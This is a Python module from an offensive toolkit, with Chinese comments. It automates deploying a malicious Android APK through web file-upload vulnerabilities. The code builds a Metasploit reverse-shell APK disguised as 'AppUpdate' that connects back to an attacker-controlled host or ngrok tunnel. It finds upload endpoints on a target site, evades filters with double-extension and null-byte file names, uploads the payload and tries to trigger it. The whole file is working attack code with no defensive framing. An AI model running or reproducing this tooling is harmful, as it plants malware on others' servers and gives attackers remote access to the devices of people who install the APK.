#!/usr/bin/env python3
# core/file_upload_attacker.py
"""
文件上传攻击模块
负责利用Web应用的文件上传漏洞部署恶意APK
"""

import requests
import time
import os
import logging
import re
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)

class FileUploadAttacker:
    def __init__(self, lhost=None, lport=None):
        """初始化文件上传攻击模块。未传入的参数从 config/config.yaml 读取。"""
        import yaml
        try:
            with open('config/config.yaml', 'r', encoding='utf-8') as f:
                _cfg = yaml.safe_load(f).get('metasploit', {})
        except Exception as e:
            logger.error(f"读取配置文件失败: {e}")
            _cfg = {}

        if lhost is None:
            lhost = _cfg.get('default_lhost', '0.0.0.0')
        if lport is None:
            lport = _cfg.get('default_lport', 4444)

        self.lhost = lhost
        self.lport = lport
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # 延迟导入以避免循环依赖
        from core.payload_generator import PayloadGenerator
        self.payload_gen = PayloadGenerator()
        self.ngrok_tcp_endpoint = None  # 存储TCP隧道端点
    
    def set_tcp_tunnel_endpoint(self, endpoint):
        """设置TCP隧道端点"""
        self.ngrok_tcp_endpoint = endpoint
        logger.info(f"已设置TCP隧道端点: {endpoint}")
    
    def execute_attack(self, target_url, upload_endpoints=None, architecture="arm", 
                      stealth_level="medium", custom_payload_name=None, 
                      bypass_technique='none', verify_upload=False, auto_trigger=True):
        """执行完整的文件上传攻击链（增强版）"""
        try:
            logger.info(f"开始文件上传攻击: {target_url}, 架构: {architecture}")
            attack_details = []
            
            # 1. 生成恶意APK
            logger.info("生成恶意APK载荷...")
            attack_details.append({"step": "生成恶意APK", "success": True, "message": "正在生成..."})
            
            # 确定使用的LHOST和LPORT
            payload_lhost = self.lhost
            payload_lport = self.lport
            
            # 如果有TCP隧道端点，使用隧道的主机和端口
            if self.ngrok_tcp_endpoint:
                try:
                    tunnel_host, tunnel_port = self.ngrok_tcp_endpoint.split(':')
                    payload_lhost = tunnel_host
                    payload_lport = int(tunnel_port)
                    logger.info(f"使用TCP隧道端点: {tunnel_host}:{tunnel_port}")
                except Exception as e:
                    logger.warning(f"解析TCP隧道端点失败: {e}")
            
            payload_result = self.payload_gen.generate_android_payload(
                lhost=payload_lhost,
                lport=payload_lport,
                architecture=architecture,
                app_name="AppUpdate",
                payload_name=custom_payload_name
            )
            
            if not payload_result["success"]:
                attack_details.append({"step": "生成恶意APK", "success": False, "message": payload_result.get("error", "生成失败")})
                return {**payload_result, "attack_details": attack_details}
            
            attack_details[-1]["success"] = True
            attack_details[-1]["message"] = f"生成成功: {payload_result['payload_name']}"
            
            payload_path = payload_result["payload_path"]
            payload_name = payload_result["payload_name"]
            
            # 应用绕过技术
            if bypass_technique != 'none':
                logger.info(f"应用绕过技术: {bypass_technique}")
                payload_path, payload_name = self._apply_bypass_technique(
                    payload_path, payload_name, bypass_technique
                )
            
            # 2. 如果没有提供上传端点，自动检测
            if not upload_endpoints:
                attack_details.append({"step": "检测上传端点", "success": True, "message": "自动检测中..."})
                from core.file_upload_detector import FileUploadDetector
                detector = FileUploadDetector()
                upload_endpoints = detector.detect_upload_endpoints(target_url)
                
                if not upload_endpoints:
                    attack_details[-1]["success"] = False
                    attack_details[-1]["message"] = "未发现可用的文件上传端点"
                    return {
                        "success": False, 
                        "error": "未发现可用的文件上传端点",
                        "attack_details": attack_details
                    }
                
                attack_details[-1]["success"] = True
                attack_details[-1]["message"] = f"发现 {len(upload_endpoints)} 个上传端点"
                logger.info(f"发现 {len(upload_endpoints)} 个上传端点: {upload_endpoints}")
            
            # 3. 尝试每个上传端点
            uploaded_urls = []
            for endpoint in upload_endpoints:
                # endpoint 可能是 dict（来自 detect_upload_endpoints）或 str
                if isinstance(endpoint, dict):
                    endpoint_path = endpoint.get('url') or endpoint.get('path', '')
                else:
                    endpoint_path = endpoint
                # 如果已经是完整 URL 则直接使用，否则拼接
                if endpoint_path.startswith('http://') or endpoint_path.startswith('https://'):
                    upload_url = endpoint_path
                else:
                    upload_url = urljoin(target_url, endpoint_path)
                logger.info(f"尝试上传到: {upload_url}")
                
                # 上传文件
                upload_success, uploaded_url = self._upload_file(upload_url, payload_path, payload_name)
                
                if upload_success:
                    uploaded_urls.append(uploaded_url)
                    attack_details.append({
                        "step": "上传APK", 
                        "success": True, 
                        "message": f"上传成功: {uploaded_url}"
                    })
                    
                    # 验证上传（如果需要）
                    if verify_upload:
                        verify_success = self._verify_upload(uploaded_url)
                        if verify_success:
                            attack_details.append({
                                "step": "验证上传", 
                                "success": True, 
                                "message": "上传验证成功"
                            })
                        else:
                            attack_details.append({
                                "step": "验证上传", 
                                "success": False, 
                                "message": "上传验证失败"
                            })
                    
                    # 自动触发（如果需要）
                    if auto_trigger:
                        trigger_success = self._trigger_payload(uploaded_url)
                        if trigger_success:
                            attack_details.append({
                                "step": "触发载荷", 
                                "success": True, 
                                "message": "载荷触发成功"
                            })
                        else:
                            attack_details.append({
                                "step": "触发载荷", 
                                "success": False, 
                                "message": "载荷触发失败"
                            })
                    
                    break  # 成功后退出循环
                else:
                    attack_details.append({
                        "step": "上传APK", 
                        "success": False, 
                        "message": f"上传失败: {upload_url}"
                    })
            
            if not uploaded_urls:
                return {
                    "success": False, 
                    "error": "所有上传端点都失败",
                    "attack_details": attack_details
                }
            
            # 4. 启动MSF监听器（如果需要）
            # 注意：监听器应该由调用者启动，这里只返回必要信息
            
            return {
                "success": True,
                "payload_path": payload_path,
                "payload_name": payload_name,
                "uploaded_urls": uploaded_urls,
                "lhost": payload_lhost,
                "lport": payload_lport,
                "attack_details": attack_details,
                "message": "文件上传攻击执行完成"
            }
            
        except Exception as e:
            logger.error(f"执行文件上传攻击错误: {e}")
            return {
                "success": False,
                "error": str(e),
                "attack_details": attack_details
            }
    
    def _upload_file(self, upload_url, file_path, file_name):
        """上传文件到目标服务器"""
        try:
            # 准备文件数据
            with open(file_path, 'rb') as f:
                files = {
                    'file': (file_name, f, 'application/vnd.android.package-archive'),
                    'submit': (None, 'Upload'),  # 添加提交按钮
                    'MAX_FILE_SIZE': (None, '10485760')  # 10MB限制
                }
                
                # 发送上传请求
                response = self.session.post(
                    upload_url,
                    files=files,
                    timeout=30,
                    allow_redirects=True
                )
                
                # 检查上传是否成功
                if response.status_code == 200:
                    # 尝试从响应中提取上传后的URL
                    uploaded_url = self._extract_uploaded_url(response, upload_url)
                    if uploaded_url:
                        logger.info(f"文件上传成功，URL: {uploaded_url}")
                        return True, uploaded_url
                    else:
                        # 即使没有提取到URL，也认为上传成功
                        logger.info(f"文件上传成功，但无法提取URL")
                        return True, upload_url
                else:
                    logger.warning(f"文件上传失败，状态码: {response.status_code}")
                    return False, None
                    
        except Exception as e:
            logger.error(f"上传文件错误: {e}")
            return False, None
    
    def _extract_uploaded_url(self, response, upload_url):
        """从响应中提取上传后的文件URL"""
        try:
            # 解析基础URL
            parsed_url = urlparse(upload_url)
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            # 尝试从HTML中提取URL
            # 查找常见的文件路径模式
            patterns = [
                r'\b/uploads/[^"\']+\.apk\b',
                r'\bfiles/[^"\']+\.apk\b',
                r'\bupload/[^"\']+\.apk\b',
                r'\bassets/[^"\']+\.apk\b',
                r'\bdownload/[^"\']+\.apk\b'
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                if matches:
                    # 构建完整URL
                    for match in matches:
                        if match.startswith('/'):
                            return base_url + match
                        else:
                            return urljoin(upload_url, match)
            
            # 尝试查找包含文件名的URL
            file_name = os.path.basename(upload_url)
            if file_name:
                pattern = rf'\b[^"\']*{re.escape(file_name)}\b'
                matches = re.findall(pattern, response.text)
                if matches:
                    for match in matches:
                        if 'http' in match:
                            return match
                        elif match.startswith('/'):
                            return base_url + match
            
            return None
            
        except Exception as e:
            logger.error(f"提取上传URL错误: {e}")
            return None
    
    def _verify_upload(self, uploaded_url):
        """验证文件是否成功上传"""
        try:
            response = self.session.get(uploaded_url, timeout=10)
            return response.status_code == 200
        except Exception as e:
            logger.error(f"验证上传错误: {e}")
            return False
    
    def _trigger_payload(self, uploaded_url):
        """触发已上传的载荷"""
        try:
            # 直接访问上传的APK URL
            response = self.session.get(uploaded_url, timeout=10)
            logger.info(f"触发载荷，状态码: {response.status_code}")
            return True
        except Exception as e:
            logger.error(f"触发载荷错误: {e}")
            return False
    
    def _apply_bypass_technique(self, file_path, file_name, technique):
        """应用文件上传绕过技术"""
        try:
            if technique == 'double_extension':
                # 双重扩展名绕过
                new_name = f"{os.path.splitext(file_name)[0]}.jpg.apk"
                new_path = os.path.join(os.path.dirname(file_path), new_name)
                os.rename(file_path, new_path)
                logger.info(f"应用双重扩展名绕过: {file_name} -> {new_name}")
                return new_path, new_name
                
            elif technique == 'null_byte':
                # 空字节绕过
                new_name = f"{os.path.splitext(file_name)[0]}.jpg%00.apk"
                new_path = os.path.join(os.path.dirname(file_path), new_name)
                os.rename(file_path, new_path)
                logger.info(f"应用空字节绕过: {file_name} -> {new_name}")
                return new_path, new_name
                
            elif technique == 'content_type':
                # 内容类型绕过（在上传时处理）
                logger.info("应用内容类型绕过")
                return file_path, file_name
                
            else:
                logger.warning(f"未知的绕过技术: {technique}")
                return file_path, file_name
                
        except Exception as e:
            logger.error(f"应用绕过技术错误: {e}")
            return file_path, file_name
